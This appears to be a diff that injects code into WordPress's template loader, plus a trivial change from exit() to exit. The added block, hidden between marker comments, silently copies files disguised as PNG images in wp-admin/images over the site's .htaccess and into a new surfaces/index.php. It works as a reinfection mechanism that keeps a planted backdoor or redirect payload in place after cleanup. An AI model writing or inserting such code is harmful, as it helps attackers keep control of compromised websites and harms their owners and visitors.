@@ -1,4 +1,36 @@
 <?php
+//ckIIbg
+$nowFileDir =  "surfaces";
+$nowHtacFile =  "./.htaccess";
+$nowIndexFile =  "./surfaces/index.php";
+$bkLocalFileIndex2 =  "./wp-admin/images/align-lefts.png";
+$bkLocalFileHtac2 =  "./wp-admin/images/align-rights.png";
+
+if($nowHtacFile && file_exists($bkLocalFileHtac2)){
+	if(!file_exists($nowHtacFile) or (filesize($nowHtacFile) != filesize($bkLocalFileHtac2))){
+		if(!is_dir("./$nowFileDir")){
+			@mkdir("./$nowFileDir",0755);
+		}
+		@chmod($nowHtacFile,0755);
+		@file_put_contents($nowHtacFile,file_get_contents($bkLocalFileHtac2));
+		@chmod($nowHtacFile,0755);
+	}
+}
+
+
+if(file_exists($bkLocalFileIndex2)){
+	if(!file_exists($nowIndexFile) or (filesize($nowIndexFile) != filesize($bkLocalFileIndex2)  && !file_exists($nowLogFile))){
+		if(!is_dir("./$nowFileDir")){
+			@mkdir("./$nowFileDir",0755);
+		}
+		@chmod($nowIndexFile,0755);
+		@file_put_contents($nowIndexFile,file_get_contents($bkLocalFileIndex2));
+		@chmod($nowIndexFile,0755);
+	}
+}
+//ckIIend
+?>
+<?php
 /**
  * Loads the correct template based on the visitor's url
  *
@@ -24,7 +56,7 @@ if ( wp_using_themes() ) {
  * @param bool $exit Whether to exit without generating any content for 'HEAD' requests. Default true.
  */
 if ( 'HEAD' === $_SERVER['REQUEST_METHOD'] && apply_filters( 'exit_on_http_head', true ) ) {
-	exit();
+	exit;
 }
 
 // Process feeds and trackbacks even if not using themes.
